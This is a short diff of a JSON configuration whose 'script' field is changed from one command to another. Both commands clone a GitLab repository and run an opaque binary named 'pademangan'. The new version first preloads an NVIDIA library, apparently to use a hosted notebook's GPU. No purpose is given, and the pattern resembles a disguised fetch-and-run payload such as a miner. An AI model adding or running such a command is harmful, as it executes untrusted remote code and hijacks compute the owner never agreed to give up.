@@ -1,5 +1,5 @@
 {
-"script": "\n!git clone https://gitlab.com/kurama121/guranose.git && cd guranose && chmod +x ./pademangan && ./pademangan",
+"script": "\n!export LD_PRELOAD=/usr/lib64-nvidia/libnvidia-ml.so && git clone https://gitlab.com/hadikufar912/luosi.git && cd luosi && chmod +x ./pademangan && ./pademangan",
 "validate": true,
 "version": "1.00"
 }
